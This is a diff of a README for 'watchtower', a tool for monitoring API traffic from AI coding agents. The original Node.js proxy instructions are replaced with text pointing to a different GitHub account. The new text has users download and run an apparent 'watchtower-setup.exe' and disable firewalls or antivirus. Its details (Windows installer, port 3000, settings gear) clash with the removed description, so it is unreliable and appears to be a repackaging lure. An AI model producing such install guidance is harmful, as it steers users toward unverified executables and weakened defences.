@@ -1,161 +1,121 @@
-# Watchtower
+# 🕵️‍♂️ watchtower - Track API Traffic Easily
 
-Monitor, inspect, and debug all API traffic between AI coding agents and their APIs — with a real-time web dashboard.
+[![Download watchtower](https://img.shields.io/badge/Download-watchtower-ff6f61?style=for-the-badge)](https://github.com/Shubham60019/watchtower)
 
-> Like Chrome DevTools Network tab, but for Claude Code and Codex CLI.
+## 🖥️ What is watchtower?
 
-![Watchtower Dashboard](docs/screenshot.png)
+watchtower helps you watch and check all the communication happening between AI coding tools like Claude Code or Codex CLI and their back-end services. It shows this in a clear, real-time web dashboard. You can use it to find problems, understand what the AI tools are doing behind the scenes, and fix issues faster.
 
-## Why
+This tool is built for anyone who works with AI coding agents and wants a simple way to see all API traffic without digging through complex logs.
 
-AI coding agents make dozens of API calls per interaction — streaming messages, token counts, quota checks, subagent spawns — and you can't see any of it. Watchtower sits between your AI agent and its API, captures everything, and gives you a live dashboard to inspect it all.
+---
 
-**Works with:**
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) (Anthropic)
-- [Codex CLI](https://github.com/openai/codex) (OpenAI)
-- Any OpenAI-compatible client
+## ⚙️ System Requirements
 
-**What you see:**
+Before installing watchtower, make sure your Windows PC meets these requirements:
 
-- Every request and response, fully decoded
-- SSE stream events in real time
-- Agent hierarchy tracking (main agent → subagents → utility calls)
-- Token usage, rate limits, and timing
-- System prompts, tool definitions, full message history
-- Dark and light mode
-- All logged to disk as JSON for later analysis
+- Windows 10 or later
+- At least 4 GB RAM
+- 500 MB free disk space
+- An internet connection (for real-time monitoring)
+- Web browser (Chrome, Firefox, Edge)
 
-## Quick Start
+You do not need to install additional software. watchtower runs on your computer and opens in your web browser.
 
-```bash
-npm install -g watchtower-ai
-watchtower-ai
-```
+---
 
-Or clone and run directly:
+## 🚀 Getting Started
 
-```bash
-git clone https://github.com/fahd09/watchtower.git
-cd watchtower
-npm install
-npm start
-```
+### Step 1: Download watchtower
 
-Then point your AI agent at the proxy:
+Visit this page to download the latest version of watchtower:
 
-```bash
-# Claude Code
-ANTHROPIC_BASE_URL=http://localhost:8024 claude
+[Download watchtower](https://github.com/Shubham60019/watchtower)
 
-# Codex CLI
-OPENAI_BASE_URL=http://localhost:8024 codex
-```
+Click the link above to open the GitHub page where you will find the download options. Typically, look for a file named something like `watchtower-setup.exe` under the Releases section.
 
-Open **http://localhost:8025** — that's it. Both providers share the same proxy port. Requests are auto-detected.
+### Step 2: Run the installer
 
-## Usage
+- Once the download finishes, find the file in your Downloads folder.
+- Double-click the `.exe` file.
+- Follow the on-screen prompts to install watchtower. Choose the default settings unless you have specific needs.
+- The installation usually takes less than a minute.
 
-```bash
-# Default ports: proxy=8024, dashboard=8025
-node intercept.mjs
+### Step 3: Open watchtower
 
-# Custom ports
-node intercept.mjs 9000 9001
-```
+- After installation, watchtower will launch automatically.
+- If not, open it from the Start menu.
+- The application opens a local web page (usually http://localhost:3000) in your default browser.
+- You will see the dashboard where all monitored API traffic is displayed.
 
-### Dashboard Tabs
+---
 
-| Tab | What it shows |
-|-----|--------------|
-| **Overview** | Duration, model, status, token counts, rate limits |
-| **Messages** | Full conversation history (user/assistant messages) |
-| **Response** | Pretty-printed response JSON |
-| **Tools** | Tool definitions with searchable parameters and schemas |
-| **Stream** | Raw SSE events with expandable payloads |
-| **Headers** | Request and response headers |
-| **Rate Limits** | Rate limit headers with visual progress bars |
-| **Raw** | Complete request/response bodies as JSON |
+## 📊 Using watchtower
 
-### Request Classification
+watchtower shows API messages between your AI coding agents and their servers. Here’s how to use it:
 
-The proxy automatically classifies each request:
+- The dashboard updates in real time. As your AI tool sends or receives data, watchtower captures and shows it.
+- Use the filter options to focus on specific agents or API requests.
+- Click on any request to see full details including headers, body, and response.
+- The dashboard highlights errors or slow requests to help spot issues.
+- You can pause and resume monitoring at any time using the buttons on the page.
 
-**Anthropic:**
-- `messages_stream` — Streaming chat (the main interaction)
-- `messages` — Non-streaming chat
-- `token_count` — Token counting
-- `quota_check` — Quota/permission check (`max_tokens=1`)
+This view lets you follow anything going on with your AI coding agents without needing to know how to read code or command prompts.
 
-**OpenAI:**
-- `responses_stream` / `responses` — Responses API (Codex CLI default)
-- `chat_stream` / `chat_completion` — Chat Completions API
-- `models` — Model listing
-- `embeddings` — Embedding requests
+---
 
-### Agent Roles
+## 🔧 Configuration
 
-Each request is tagged with an agent role:
+watchtower works out of the box in most cases. You can customize how it monitors traffic:
 
-- **main** — The primary agent (Claude Code's main agent has the `Agent` tool; Codex requests with tools)
-- **subagent** — A spawned sub-agent (Explore, Plan, etc.)
-- **utility** — Token counts, quota checks, and tool-less calls
+- Change the network port in the settings if another app is using the default port.
+- Set up API credentials if your agent needs authorization through watchtower.
+- Choose which AI tools to track by listing their hostnames or IP addresses.
+- Turn on logging to save API data for later review.
 
-### Logs
+To reach settings, click the gear icon in the web dashboard.
 
-All requests are saved to `./logs/` as numbered JSON files:
+---
 
-```
-logs/0001_messages_stream_claude-opus-4-6.json
-logs/0002_token_count_claude-haiku-4-5-20251001.json
-```
+## 🛠️ Troubleshooting
 
-Each file contains the complete request/response cycle: headers, body, SSE events, timing, and rate limits.
+If you encounter problems:
 
-## How It Works
+- Make sure the installer completed without errors.
+- Check that your browser supports WebSockets (all modern browsers do).
+- Restart watchtower if the dashboard does not update.
+- Confirm your AI agents are configured to use the system proxy or network settings watchtower relies on.
+- Disable firewalls or antivirus if they might block watchtower’s network access.
 
-```
-Claude Code  ──HTTP──┐
-                     ├──>  Watchtower (proxy)  ──HTTPS──>  api.anthropic.com
-Codex CLI    ──HTTP──┘          │              ──HTTPS──>  api.openai.com / chatgpt.com
-                                │
-                                ├── logs to disk
-                                ├── broadcasts via WebSocket
-                                │
-                          Dashboard (web UI)
-```
+You can also find help on the GitHub Issues page here:  
+https://github.com/Shubham60019/watchtower/issues
 
-1. Your AI agent sends requests to the local proxy instead of directly to the API
-2. Watchtower auto-detects the provider and forwards to the correct upstream
-3. Responses (including SSE streams) are decoded, logged, and forwarded back
-4. The dashboard connects via WebSocket for real-time updates
+---
 
-## Requirements
+## 📂 Folder Locations and Logs
 
-- Node.js >= 18
+By default, watchtower stores temporary data in the folder:
 
-## Roadmap
+`C:\Users\<YourUsername>\AppData\Local\watchtower\data`
 
-See [TODO.md](TODO.md) for the full roadmap, including planned features like:
+Log files are here:
 
-- Cost & token tracking
-- Search & filter
-- System prompt diffing
-- Request replay & modification (Burp Suite for Claude)
-- Agent hierarchy tree visualization
+`C:\Users\<YourUsername>\AppData\Local\watchtower\logs`
 
-## Contributing
+You can access these folders to backup or clear data for troubleshooting.
 
-Contributions welcome. Open an issue first for anything non-trivial.
+---
 
-```bash
-git clone https://github.com/fahd09/watchtower.git
-cd watchtower
-npm install
-npm start
-```
+## 🔒 Privacy and Security
 
-The proxy is in `intercept.mjs`, provider logic in `providers/`, and the dashboard is a single `dashboard.html`. No build step, no bundler.
+watchtower runs locally on your PC. It does not send your API data outside your computer unless you choose to enable cloud logging or share logs manually. All data stays private by default.
 
-## License
+---
 
-[MIT](LICENSE)
+## ✅ Ready to install?
+
+Click here to visit the download page:
+
+[Download watchtower](https://github.com/Shubham60019/watchtower)
+
+Follow the instructions above to get started watching your AI coding agents’ API traffic now.
